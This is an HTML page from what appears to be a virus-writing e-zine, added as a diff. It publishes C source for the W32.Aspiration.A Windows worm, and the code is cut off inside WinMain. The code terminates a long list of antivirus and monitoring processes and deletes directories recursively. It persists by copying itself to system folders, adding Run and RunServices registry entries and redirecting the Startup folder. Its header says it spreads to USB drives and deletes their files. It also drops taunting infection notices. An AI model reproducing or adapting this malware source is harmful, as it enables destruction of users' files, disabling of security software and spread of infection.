@@ -1,0 +1,542 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: SkyOut/EOF || <a style="text-decoration: none" href="../mainmenu/sources.htm"><span style="text-decoration: none">Back to sources</span></a> || <a style="text-decoration: none" target="_blank" href="../binsrc/SkyOut/AspirationA"><span style="text-decoration: none; color: #BFBF88">View project folder</span></a> || <hr></pre>
+<pre>
+/*
+Payload of W32.Aspiration.A:
+
+- Kills AV processes
+- Copies to 4 different locations on PC and writes to Autostart with different ways
+- Creates two text files and two HTML files and executes Notepad and IE to show them to the user
+- Deletes personal folder
+- Copies to USB flash drives (if connected) and deletes the files being saved on them
+- ... Some other little things ...
+
+#########################################################################
+#########################################################################
+
+	Author: SkyOut
+
+	Compiled with: -&gt; Visual C++ 2005 Express Edition
+				   -&gt; Microsoft PSDK for Windows Server 2003 R2
+
+	Finished: 11th July 2006 - 21:30 - GMT +01:00
+
+*/
+
+/* Defining Windows Version being WindowsXP (0x0501) */
+#define _WIN32_WINNT 0x0501
+
+/* All needed header files */
+#include &lt;windows.h&gt;
+#include &lt;tlhelp32.h&gt;
+#include &lt;shlobj.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;sys/stat.h&gt;
+#include &lt;devguid.h&gt;
+#include &lt;regstr.h&gt;
+#include &lt;setupapi.h&gt;
+#include &lt;tchar.h&gt;
+#include &lt;shellapi.h&gt;
+
+/* The first text file (for the user) */
+char szTextFile1[] = &quot; \
+W32.ASPIRATION.A\r\n \
+#################################################################\r\n \
+-\r\n \
+Your computer has been infected by the aspiration virus...\r\n \
+-\r\n \
+It's up to you to decide what to do, but it's too late, I don't care what you do now...\r\n \
+-\r\n \
+I have installed myself on the system...\r\n \
+-\r\n \
+I have destroyed your files and I will go on doing it...\r\n \
+-\r\n \
+The only sense in my life is to make yours a hell...&quot;;
+
+/* The second text file (for the AV guys) */
+char szTextFile2[] = &quot; \
+TO ALL THOSE ANTIVIRUS AND SECURITY COMPANIES\r\n \
+---------------------------------------------\r\n \
+\r\n \
+You can't stop us, you can't fight all of us!\r\n \
+We will win, we will stay, we will go on!\r\n \
+Give up or die, we will survive, you won't!\r\n \
+FUCK YOU AND GOOD BYE!&quot;;
+
+/* The first html file (for the user) */
+char szHTMLFile1[] = &quot; \
+				  &lt;html&gt;\r\n \
+				  &lt;head&gt;&lt;title&gt;- - - W32.Aspiration.A - - -&lt;/title&gt;&lt;/head&gt;\r\n \
+				  &lt;body text=\&quot;#00FF00\&quot; bgcolor=\&quot;#000000\&quot;&gt;\r\n \
+				  &lt;h1 align=\&quot;center\&quot;&gt;Your computer has been infected by the aspiration virus...&lt;/h1&gt;\r\n \
+				  &lt;h1 align=\&quot;center\&quot;&gt;It's up to you to decide what to do, but it's too late, I don't care what you do now...&lt;/h1&gt;\r\n \
+				  &lt;h1 align=\&quot;center\&quot;&gt;I have installed myself on the system....&lt;/h1&gt;\r\n \
+				  &lt;h1 align=\&quot;center\&quot;&gt;I have destroyed your files and I will go on doing it...&lt;/h1&gt;\r\n \
+				  &lt;h1 align=\&quot;center\&quot;&gt;The only sense in my life is to make yours a hell...&lt;/h1&gt;\r\n \
+				  &lt;br&gt;\r\n \
+				  &lt;br&gt;\r\n \
+				  &lt;hr&gt;\r\n \
+				  &lt;h1 align=\&quot;center\&quot;&gt;&lt;font color=\&quot;#FF0000\&quot;&gt;W32.ASPIRATION.A&lt;/font&gt;&lt;/h1&gt;\r\n \
+				  &lt;/body&gt;\r\n \
+				  &lt;/html&gt;\r\n&quot;;
+
+/* The second html file (for the AV guys)*/
+char szHTMLFile2[] = &quot; \
+				   &lt;html&gt;\r\n \
+				   &lt;head&gt;&lt;title&gt;--- TO THE AV COMPANIES OUT THERE ---&lt;/title&gt;&lt;/head&gt;\r\n \
+				   &lt;body text=\&quot;#00FF00\&quot; bgcolor=\&quot;#000000\&quot;&gt;\r\n \
+				   &lt;h1 align=\&quot;center\&quot;&gt;THIS PC IS INFECTED&lt;/h1&gt;\r\n \
+				   &lt;h1 align=\&quot;center\&quot;&gt;A STORM OF INFECTIONS WILL FOLLOW&lt;/h1&gt;\r\n \
+				   &lt;h1 align=\&quot;center\&quot;&gt;FUCK OFF - YOU CAN NOT STOP THIS&lt;/h1&gt;\r\n \
+				   &lt;/body&gt;\r\n \
+				   &lt;/html&gt;&quot;;
+
+/* Process list of most AV products - Thanks to Hutley/RRLF */
+char *AVProcessList[] = {&quot;avp32.exe&quot;, &quot;avpmon.exe&quot;, &quot;zonealarm.exe&quot;, &quot;vshwin32.exe&quot;, &quot;vet95.exe&quot;,
+    &quot;tbscan.exe&quot;, &quot;serv95.exe&quot;, &quot;Nspclean.exe&quot;, &quot;clrav.com&quot;, &quot;scan32.exe&quot;,
+    &quot;rav7.exe&quot;, &quot;navw.exe&quot;, &quot;outpost.exe&quot;, &quot;nmain.exe&quot;, &quot;navnt.exe&quot;,
+    &quot;mpftray.exe&quot;, &quot;lockdown2000.exe&quot;, &quot;icssuppnt.exe&quot;, &quot;icload95.exe&quot;, &quot;iamapp.exe&quot;,
+    &quot;findviru.exe&quot;, &quot;f - agnt95.exe&quot;, &quot;dv95.exe&quot;, &quot;dv95_o.exe&quot;, &quot;claw95ct.exe&quot;,
+    &quot;cfiaudit.exe&quot;, &quot;avwupd32.exe&quot;, &quot;avptc32.exe&quot;, &quot;_avp32.exe&quot;, &quot;avgctrl.exe&quot;,
+    &quot;apvxdwin.exe&quot;, &quot;_avpcc.exe&quot;, &quot;avpcc.exe&quot;, &quot;wfindv32.exe&quot;, &quot;vsecomr.exe&quot;,
+    &quot;tds2 - nt.exe&quot;, &quot;sweep95.exe&quot;, &quot;EFINET32.EXE&quot;, &quot;scrscan.exe&quot;, &quot;safeweb.exe&quot;,
+    &quot;persfw.exe&quot;, &quot;navsched.exe&quot;, &quot;nvc95.exe&quot;, &quot;nisum.exe&quot;, &quot;navlu32.exe&quot;,
+    &quot;ALOGSERV&quot;, &quot;AMON9X&quot;, &quot;AVGSERV9&quot;, &quot;AVGW&quot;, &quot;avkpop&quot;,
+    &quot;avkservice&quot;, &quot;AvkServ&quot;, &quot;avkwctl9&quot;, &quot;AVXMONITOR9X&quot;, &quot;AVXMONITORNT&quot;,
+    &quot;AVXQUAR&quot;, &quot;moolive.exe&quot;, &quot;jed.exe&quot;, &quot;icsupp95.exe&quot;, &quot;ibmavsp.exe&quot;,
+    &quot;frw.exe&quot;, &quot;f - stopw.exe&quot;, &quot;espwatch.exe&quot;, &quot;procexp&quot;, &quot;filemon.exe&quot;,
+    &quot;regmon.exe&quot;, &quot;dvp95.exe&quot;, &quot;cfiadmin.exe&quot;, &quot;avwin95.exe&quot;, &quot;avpm.exe&quot;,
+    &quot;avp.exe&quot;, &quot;ave32.exe&quot;, &quot;anti - trojan.exe&quot;, &quot;webscan.exe&quot;, &quot;webscanx.exe&quot;,
+    &quot;vsscan40.exe&quot;, &quot;tds2 - 98. exe&quot;, &quot;SymProxySvc&quot;, &quot;SYMTRAY&quot;, &quot;TAUMON&quot;,
+    &quot;TCM&quot;, &quot;TDS - 3 &quot;, &quot;TFAK&quot;, &quot;vbcmserv&quot;, &quot;VbCons&quot;,
+    &quot;VIR - HELP&quot;, &quot;VPC32&quot;, &quot;VPTRAY&quot;, &quot;VSMAIN&quot;, &quot;vsmon&quot;,
+    &quot;WIMMUN32&quot;, &quot;WGFE95&quot;, &quot;WEBTRAP&quot;, &quot;WATCHDOG&quot;, &quot;WrAdmin&quot;,
+    &quot;sphinx.exe&quot;, &quot;scanpm.exe&quot;, &quot;rescue.exe&quot;, &quot;pcfwallicon.exe&quot;, &quot;pavcl.exe&quot;,
+    &quot;nupgrade.exe&quot;, &quot;navwnt.exe&quot;, &quot;navapw32.exe&quot;, &quot;luall.exe&quot;, &quot;iomon98.exe&quot;,
+    &quot;icmoon.exe&quot;, &quot;fprot.exe&quot;, &quot;f - prot95.exe&quot;, &quot;esafe.exe&quot;, &quot;cleaner3.exe&quot;,
+    &quot;IBMASN.EXE&quot;, &quot;AVXW&quot;, &quot;cfgWiz&quot;, &quot;CMGRDIAN&quot;, &quot;CONNECTIONMONITOR&quot;,
+    &quot;CPDClnt&quot;, &quot;DEFWATCH&quot;, &quot;CTRL&quot;, &quot;defalert&quot;, &quot;defscangui&quot;,
+    &quot;DOORS&quot;, &quot;EFPEADM&quot;, &quot;ETRUSTCIPE&quot;, &quot;EVPN&quot;, &quot;EXPERT&quot;,
+    &quot;fameh32&quot;, &quot;fch32&quot;, &quot;fih32&quot;, &quot;blackice.exe&quot;, &quot;avsched32.exe&quot;,
+    &quot;avpdos32.exe&quot;, &quot;avpnt.exe&quot;, &quot;avconsol.exe&quot;, &quot;ackwin32.exe&quot;, &quot;NWTOOL16&quot;,
+    &quot;pccwin97&quot;, &quot;PROGRAMAUDITOR&quot;, &quot;POP3TRAP&quot;, &quot;PROCESSMONITOR&quot;, &quot;PORTMONITOR&quot;,
+    &quot;POPROXY&quot;, &quot;pcscan&quot;, &quot;pcntmon&quot;, &quot;pavproxy&quot;, &quot;PADMIN&quot;,
+    &quot;pview95&quot;, &quot;rapapp.exe&quot;, &quot;REALMON&quot;, &quot;RTVSCN95&quot;, &quot;vsstat.exe&quot;,
+    &quot;vettray.exe&quot;, &quot;tca.exe&quot;, &quot;smc.exe&quot;, &quot;scan95.exe&quot;, &quot;rav7win.exe&quot;,
+    &quot;pccwin98.exe&quot;, &quot;KPFW32.EXE&quot;, &quot;ADVXDWIN&quot;, &quot;padmin.exe&quot;, &quot;normist.exe&quot;,
+    &quot;navw32.exe&quot;, &quot;n32scan.exe&quot;, &quot;lookout.exe&quot;, &quot;iface.exe&quot;, &quot;icloadnt.exe&quot;,
+    &quot;SPYXX&quot;, &quot;SS3EDIT&quot;, &quot;SweepNet&quot;, &quot;iamserv.exe&quot;, &quot;fp - win.exe&quot;,
+    &quot;f - prot.exe&quot;, &quot;ecengine.exe&quot;, &quot;cleaner.exe&quot;, &quot;cfind.exe&quot;, &quot;blackd.exe&quot;,
+    &quot;RULAUNCH&quot;, &quot;sbserv&quot;, &quot;SWNETSUP&quot;, &quot;WrCtrl&quot;, &quot;avpupd.exe&quot;,
+    &quot;avkserv.exe&quot;, &quot;autodown.exe&quot;, &quot;_avpm.exe&quot;, &quot;AvpM.exe&quot;, &quot;regedit.exe&quot;,
+    &quot;msconfig.exe&quot;, &quot;FPROT95.EXE&quot;, &quot;IBMASN.EXE&quot;, &quot;sfc.exe&quot;, &quot;regedt32.exe&quot;,
+    &quot;offguard.exe&quot;, &quot;pav.exe&quot;, &quot;pavmail.exe&quot;, &quot;per.exe&quot;, &quot;perd.exe&quot;,
+    &quot;pertsk.exe&quot;, &quot;perupd.exe&quot;, &quot;pervac.exe&quot;, &quot;pervacd.exe&quot;, &quot;th.exe&quot;,
+    &quot;th32.exe&quot;, &quot;th32upd.exe&quot;, &quot;thav.exe&quot;, &quot;thd.exe&quot;, &quot;thd32.exe&quot;,
+    &quot;thmail.exe&quot;, &quot;alertsvc.exe&quot;, &quot;amon.exe&quot;, &quot;kpf.exe&quot;, &quot;antivir&quot;,
+    &quot;avsynmgr.exe&quot;, &quot;cfinet.exe&quot;, &quot;cfinet32.exe&quot;, &quot;icmon.exe&quot;, &quot;lockdownadvanced.exe&quot;,
+    &quot;lucomserver.exe&quot;, &quot;mcafee&quot;, &quot;navapsvc.exe&quot;, &quot;navrunr.exe&quot;, &quot;nisserv.exe&quot;,
+    &quot;nsched32.exe&quot;, &quot;pcciomon.exe&quot;, &quot;pccmain.exe&quot;, &quot;pview95.exe&quot;, &quot;Avnt.exe&quot;,
+    &quot;Claw95cf.exe&quot;, &quot;Dvp95_0.exe&quot;, &quot;Vscan40.exe&quot;, &quot;Icsuppnt.exe&quot;, &quot;Jedi.exe&quot;,
+    &quot;N32scanw.exe&quot;, &quot;Pavsched.exe&quot;, &quot;Pavw.exe&quot;, &quot;Avrep32.exe&quot;, &quot;Monitor.exe&quot;,
+    &quot;fsgk32&quot;, &quot;fsm32&quot;, &quot;fsma32&quot;, &quot;fsmb32&quot;, &quot;gbmenu&quot;,
+    &quot;GBPOLL&quot;, &quot;GENERICS&quot;, &quot;GUARD&quot;, &quot;IAMSTATS&quot;, &quot;ISRV95&quot;,
+    &quot;LDPROMENU&quot;, &quot;LDSCAN&quot;, &quot;LUSPT&quot;, &quot;MCMNHDLR&quot;, &quot;MCTOOL&quot;,
+    &quot;MCUPDATE&quot;, &quot;MCVSRTE&quot;, &quot;MGHTML&quot;, &quot;MINILOG&quot;, &quot;MCVSSHLD&quot;,
+    &quot;MCAGENT&quot;, &quot;MPFSERVICE&quot;, &quot;MWATCH&quot;, &quot;NeoWatchLog&quot;, &quot;NVSVC32&quot;,
+    &quot;NWService&quot;, &quot;NTXconfig&quot;, &quot;NTVDM&quot;, &quot;ntrtscan&quot;, &quot;npssvc&quot;,
+    &quot;npscheck&quot;, &quot;netutils&quot;, &quot;ndd32&quot;, &quot;NAVENGNAVEX15&quot;, &quot;notstart.exe&quot;,
+    &quot;zapro.exe&quot;, &quot;pqremove.com&quot;, &quot;BullGuard&quot;, &quot;CCAPP.EXE&quot;, &quot;vet98.exe&quot;,
+    &quot;VET32.EXE&quot;, &quot;VCONTROL.EXE&quot;, &quot;claw95.exe&quot;, &quot;ANTS&quot;, &quot;ATCON&quot;,
+    &quot;ATUPDATER&quot;, &quot;ATWATCH&quot;, &quot;AutoTrace&quot;, &quot;AVGCC32&quot;, &quot;AvgServ&quot;,
+    &quot;AVWINNT&quot;, &quot;fnrb32&quot;, &quot;fsaa&quot;, &quot;fsav32&quot;, &quot;ZAP.EXE&quot;,
+    &quot;ZAPD.EXE&quot;, &quot;ZAPPRG.EXE&quot;, &quot;ZAPS.EXE&quot;, &quot;ZCAP.EXE&quot;, &quot;pfwagent.exe&quot;,
+	&quot;pfwcon.exe&quot;, &quot;zlclient.exe&quot;, 0};
+
+/* Going through the array of processes and comparing the names with running processes, if
+it matches, the process will be terminated */
+void KillProcess(char *AVProcessList)
+{
+	HANDLE hProcSnap;
+	HANDLE hProc;
+	PROCESSENTRY32 pe32;
+
+	pe32.dwSize = sizeof(PROCESSENTRY32);
+	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+	Process32First(hProcSnap, &amp;pe32);
+
+	do
+	{
+		hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pe32.th32ProcessID);
+		if(strcmp(pe32.szExeFile, AVProcessList)==0)
+		{
+			TerminateProcess(hProc, 0);
+			CloseHandle(hProc);
+		}
+		CloseHandle(hProc);
+
+	}while (Process32Next(hProcSnap, &amp;pe32));
+}
+
+/* Deleting a directory given to this function recursively */
+BOOL DeleteDirectoryRecursive(char *szPathToDelete) 
+{
+	HANDLE hFind;
+    WIN32_FIND_DATA w32FD;
+    char szFileName[MAX_PATH];
+ 
+    strcpy_s(szFileName, sizeof(szFileName), szPathToDelete);
+    strcat_s(szFileName, sizeof(szFileName), &quot;\\*&quot;);
+
+    hFind = FindFirstFile(szFileName, &amp;w32FD);
+
+	/* As long as files and folders are found in a directory do this */	
+	do
+	{
+		/* Go on when the file name is NOT &quot; . &quot; and &quot; .. &quot; */
+		if (!((strcmp((char*) w32FD.cFileName, &quot;.&quot;) &amp;&amp; strcmp((char*) w32FD.cFileName, &quot;..&quot;))))
+		{
+			continue;
+		}
+
+		((strcpy_s(szFileName, sizeof(szFileName), szPathToDelete)) &amp; (strcat_s(szFileName, sizeof(szFileName), &quot;\\&quot;)));
+        strcat_s(szFileName, sizeof(szFileName), w32FD.cFileName);
+
+		/* If the folder is a directoy than remove it or stop if it does'nt work */
+        if(w32FD.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) 
+		{
+            if(!DeleteDirectoryRecursive(szFileName)) 
+			{ 
+                FindClose(hFind); 
+                return 0; 
+            }
+            RemoveDirectory(szFileName);
+        }
+        else 
+		{
+			/* If the file we want to delete is readonly change file attributes, so we can delete it */
+            if(w32FD.dwFileAttributes &amp; FILE_ATTRIBUTE_READONLY)
+			{
+                _chmod(szFileName, _S_IWRITE);
+			}
+
+			/* Delete the file or stop if it doesnt work */
+            if(!DeleteFile(szFileName)) 
+			{  
+                FindClose(hFind); 
+                return 0; 
+			}
+		}
+	}while(FindNextFile(hFind, &amp;w32FD));
+	FindClose(hFind);
+
+	/* Remove the whole directory now */
+	RemoveDirectory(szPathToDelete);
+	return 1;
+}
+
+/* Check the registry for a special value telling us if the computer is infected */
+BOOL TestIfInfected()
+{
+	HKEY hKey;
+	char szBuf[MAX_PATH];
+	DWORD dwBufLength = sizeof(szBuf);
+
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;Software\\Aspiration&quot;, 0, KEY_QUERY_VALUE, &amp;hKey);
+	RegQueryValueEx(hKey, &quot;infected&quot;, 0, NULL, szBuf, &amp;dwBufLength);
+	RegCloseKey(hKey);
+
+	/* Check for &quot;HKEY_LOCAL_MACHINE\Software\Aspiration\infected&quot; = &quot;infected&quot; */
+	if (szBuf[0]!='i' || szBuf[1]!='n' || szBuf[3]!='f' || szBuf[4]!='e' || szBuf[5]!='c' || szBuf[6]!='t' || szBuf[7]!='e' || szBuf[8]!='d')
+	{
+		return -1;
+	}
+	else
+	{
+		return 0;
+	}
+}
+
+/* Write the key into the registry showing us that the computer is infected with the virus now */
+void Infect(void)
+{
+	HKEY hKey;
+	char szInfected[] = &quot;infected&quot;;
+
+	RegCreateKey(HKEY_LOCAL_MACHINE, &quot;Software\\Aspiration&quot;, &amp;hKey);
+	RegSetValueEx(hKey, &quot;infected&quot;, 0, REG_SZ, szInfected, sizeof(szInfected));
+	RegCloseKey(hKey);
+}
+
+/* 
+Copying to several locations on the computer:
+-&gt; %windir%\system32\aspiration.exe
+-&gt; %windir%\aspiration.exe
+-&gt; %windir%\system32\Hell\aspiration.exe
+-&gt; %windir%\Hell\aspiration.exe
+
+Writing to several registry keys: HKEY_LOCAL_MACHINE and HKEY_CURRENT_USER:
+(Creating keys if necessary)
+-&gt;Software\\Microsoft\\Windows\\CurrentVersion\\Run
+-&gt;Software\\Microsoft\\Windows\\CurrentVersion\\RunServices
+-&gt;Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders
+*/
+void InfRegCopy(void)
+{
+	HKEY hKey;
+	HMODULE Mod;
+	HANDLE hFile;
+	char szSysDir[MAX_PATH];
+	char szWinDir[MAX_PATH];
+	char szSysDir2[MAX_PATH];
+	char szWinDir2[MAX_PATH];
+	char szSysDir2File[MAX_PATH];
+	char szWinDir2File[MAX_PATH];
+	char szVirusPath[MAX_PATH];
+
+	Mod = GetModuleHandle(NULL);
+	GetModuleFileName(Mod, szVirusPath, sizeof(szVirusPath));
+
+	GetSystemDirectory(szSysDir, sizeof(szSysDir));
+	GetWindowsDirectory(szWinDir, sizeof(szWinDir));
+	GetSystemDirectory(szSysDir2, sizeof(szSysDir2));
+	GetWindowsDirectory(szWinDir2, sizeof(szWinDir2));
+	GetSystemDirectory(szSysDir2File, sizeof(szSysDir2File));
+	GetWindowsDirectory(szWinDir2File, sizeof(szWinDir2File));
+
+	strcat_s(szSysDir, MAX_PATH, &quot;\\aspiration.exe&quot;);
+	strcat_s(szWinDir, MAX_PATH, &quot;\\aspiration.exe&quot;);
+	strcat_s(szSysDir2, MAX_PATH, &quot;\\Hell&quot;);
+	strcat_s(szWinDir2, MAX_PATH, &quot;\\Hell&quot;);
+	strcat_s(szSysDir2File, MAX_PATH, &quot;\\Hell\\aspiration.exe&quot;);
+	strcat_s(szWinDir2File, MAX_PATH, &quot;\\Hell\\aspiration.exe&quot;);
+
+	CreateDirectory(szSysDir2, NULL);
+	CreateDirectory(szWinDir2, NULL);
+
+	/* Copy to the locations on the victims computer */
+	CopyFile(szVirusPath, szSysDir, FALSE);
+	CopyFile(szVirusPath, szWinDir, FALSE);
+	CopyFile(szVirusPath, szSysDir2File, FALSE);
+	CopyFile(szVirusPath, szWinDir2File, FALSE);
+
+	/* Create the registry keys to make sure that they exist when writing to them */
+	RegCreateKey(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, &amp;hKey);
+	RegCreateKey(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\RunServices&quot;, &amp;hKey);
+
+	RegCreateKey(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, &amp;hKey);
+	RegCreateKey(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\RunServices&quot;, &amp;hKey);
+
+	RegCreateKey(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders&quot;, &amp;hKey);
+	RegCreateKey(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders&quot;, &amp;hKey);
+
+	/* Write all the necessary registry keys making our virus start (several times) every login of the user */
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;aspiration&quot;, 0, REG_SZ, szSysDir, sizeof(szSysDir));
+	RegSetValueEx(hKey, &quot;destiny&quot;, 0, REG_SZ, szWinDir, sizeof(szWinDir));
+	RegCloseKey(hKey);
+
+	RegOpenKeyEx(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;aspiration&quot;, 0, REG_SZ, szSysDir, sizeof(szSysDir));
+	RegSetValueEx(hKey, &quot;destiny&quot;, 0, REG_SZ, szWinDir, sizeof(szWinDir));
+	RegCloseKey(hKey);
+
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;suicide&quot;, 0, REG_SZ, szSysDir2File, sizeof(szSysDir2File));
+	RegSetValueEx(hKey, &quot;carnage&quot;, 0, REG_SZ, szWinDir2File, sizeof(szWinDir2File));
+	RegCloseKey(hKey);
+
+	RegOpenKeyEx(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;suicide&quot;, 0, REG_SZ, szSysDir2File, sizeof(szSysDir2File));
+	RegSetValueEx(hKey, &quot;carnage&quot;, 0, REG_SZ, szWinDir2File, sizeof(szWinDir2File));
+	RegCloseKey(hKey);
+
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\RunServices&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;aspiration&quot;, 0, REG_SZ, szSysDir, sizeof(szSysDir));
+	RegSetValueEx(hKey, &quot;destiny&quot;, 0, REG_SZ, szWinDir, sizeof(szWinDir));
+	RegCloseKey(hKey);
+
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\RunServices&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;suicide&quot;, 0, REG_SZ, szSysDir2File, sizeof(szSysDir2File));
+	RegSetValueEx(hKey, &quot;carnage&quot;, 0, REG_SZ, szWinDir2File, sizeof(szWinDir2File));
+	RegCloseKey(hKey);
+
+	/* Interesting here: Set the startup folder value to a folder we created and where our virus has been copied to */
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;Common Startup&quot;, 0, REG_SZ, szSysDir2, sizeof(szSysDir2));
+	RegCloseKey(hKey);
+
+	RegOpenKeyEx(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;Startup&quot;, 0, REG_SZ, szWinDir2, sizeof(szWinDir2));
+	RegCloseKey(hKey);
+}
+
+/* Writing the two text files and saving them to the program files folder */
+void WriteLetters(void)
+{
+	HANDLE hFile;
+	char szProgramFiles[MAX_PATH];
+	DWORD dwNumberOfBytesWritten;
+
+	SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, szProgramFiles);
+
+	chdir(szProgramFiles);
+
+	hFile = CreateFile(&quot;ASPIRATION_INFECTION.txt&quot;, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	WriteFile(hFile, szTextFile1, sizeof(szTextFile1), &amp;dwNumberOfBytesWritten, NULL); 
+	CloseHandle(hFile);
+
+	hFile = CreateFile(&quot;FOR_AV_SECURITY_COMPANIES.txt&quot;, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	WriteFile(hFile, szTextFile2, sizeof(szTextFile2), &amp;dwNumberOfBytesWritten, NULL); 
+	CloseHandle(hFile);
+}
+
+/* Writing the two html files and saving them to %windir%\system32 and %windir% */
+void WriteHTML(void)
+{
+	HANDLE hFile;
+	char szSysDir[MAX_PATH];
+	char szWinDir[MAX_PATH];
+	DWORD dwNumberOfBytesWritten;
+
+	GetSystemDirectory(szSysDir, sizeof(szSysDir));
+	GetWindowsDirectory(szWinDir, sizeof(szWinDir));
+
+	chdir(szSysDir);
+
+	hFile = CreateFile(&quot;ASPIRATION_INFECTION.html&quot;, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	WriteFile(hFile, szHTMLFile1, sizeof(szHTMLFile1), &amp;dwNumberOfBytesWritten, NULL); 
+	CloseHandle(hFile);
+
+	chdir(szWinDir);
+
+	hFile = CreateFile(&quot;ASPIRATION_INFECTION.html&quot;, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	WriteFile(hFile, szHTMLFile2, sizeof(szHTMLFile2), &amp;dwNumberOfBytesWritten, NULL); 
+	CloseHandle(hFile);
+}
+
+/* An array of possible drive letter, not including &quot; a: &quot; and &quot; b: &quot; as they could be a floppy drive, which we don't like to have */
+char *drives[] =  {&quot;c:&quot;, &quot;d:&quot;, &quot;e:&quot;, &quot;f:&quot;, &quot;g:&quot;, &quot;h:&quot;, &quot;i:&quot;, &quot;j:&quot;, &quot;k:&quot;, &quot;l:&quot;,
+                   &quot;m:&quot;, &quot;n:&quot;, &quot;o:&quot;, &quot;p:&quot;, &quot;q:&quot;, &quot;r:&quot;, &quot;s:&quot;, &quot;t:&quot;, &quot;u:&quot;, &quot;v:&quot;, &quot;w:&quot;, &quot;x:&quot;,
+                   &quot;y:&quot;, &quot;z:&quot;, 0};
+
+/* Test the computer for a connected USB flash drive by using the array above */
+BOOL IsItUSB(char *drives)
+{
+	UINT drType = GetDriveType(drives);
+
+	if (drType == DRIVE_REMOVABLE)
+	{
+		return 1;
+	}
+	return 0;
+}
+
+/* ############################################################################################### */
+/* --- --- MAIN CODE NOW --- --- MAIN CODE NOW --- --- MAIN CODE NOW --- --- MAIN CODE NOW --- --- */
+/* ############################################################################################### */
+
+int WINAPI WinMain (HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, int iCmdShow)
+{
+	BOOL bInfected;
+	char szPersonalFolderPath[MAX_PATH];
+	char szProgramFilesPath[MAX_PATH];
+	char szSysDirHTML[MAX_PATH];
+	char szWinDirHTML[MAX_PATH];
+	char szFileTXT1[MAX_PATH];
+	char szFileTXT2[MAX_PATH];
+	int i;
+
+	/* Kill all the processes of the array &quot; AVProcessList &quot; */
+	for (i = 0; AVProcessList[i]; i++)
+	{
+		KillProcess(AVProcessList[i]);
+	}
+
+	/* Test if the computer is infected with our virus */
+	bInfected = TestIfInfected();
+
+	/* If the computer is not infected -&gt; infect it and write all the necessary files and registry keys */
+	if (bInfected = -1)
+	{
+		Infect();
+		InfRegCopy();
+		WriteLetters();
+		WriteHTML();
+
+		GetSystemDirectory(szSysDirHTML, sizeof(szSysDirHTML));
+		GetWindowsDirectory(szWinDirHTML, sizeof(szWinDirHTML));
+
+		strcat_s(szSysDirHTML, MAX_PATH, &quot;\\ASPIRATION_INFECTION.html&quot;);
+		strcat_s(szWinDirHTML, MAX_PATH, &quot;\\ASPIRATION_INFECTION.html&quot;);
+
+		SHGetFolderPath(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, szProgramFilesPath);
+
+		strcpy_s(szFileTXT1, MAX_PATH, szProgramFilesPath);
+		strcpy_s(szFileTXT2, MAX_PATH, szProgramFilesPath);
+		strcat_s(szFileTXT1, MAX_PATH, &quot;\\ASPIRATION_INFECTION.txt&quot;);
+		strcat_s(szFileTXT2, MAX_PATH, &quot;\\FOR_AV_SECURITY_COMPANIES.txt&quot;);
+
+		/* Use Internet Explorer to open the two html files */
+		ShellExecute(NULL, &quot;open&quot;, &quot;IExplore.exe&quot;, szSysDirHTML, NULL, SW_MAXIMIZE);
